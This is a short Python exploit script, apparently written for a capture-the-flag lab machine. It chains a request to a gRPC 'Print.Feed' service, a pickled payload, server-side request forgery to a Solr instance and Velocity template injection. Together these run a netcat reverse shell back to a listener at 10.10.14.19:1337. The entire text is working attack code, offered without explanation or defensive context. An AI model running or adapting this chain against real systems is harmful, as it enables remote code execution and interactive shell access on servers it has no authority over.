import base64
import pickle
import urllib
from urllib import parse
import os
import sys

command = "rm /tmp/kun;mkfifo /tmp/kun;cat /tmp/kun|/bin/bash -i 2>&1|nc 10.10.14.19 1337 >/tmp/kun"
command = urllib.parse.quote(command)
data1 = '{"feed_url":"http://localhost:8983/solr/staging/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(' + command +'))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"}'

data = base64.b64encode(pickle.dumps(data1))
os.system("./grpcurl -plaintext -d '{\"data\":\"%s\"}' -proto proto/s.proto 10.10.10.201:9000 Print.Feed" % data.decode())
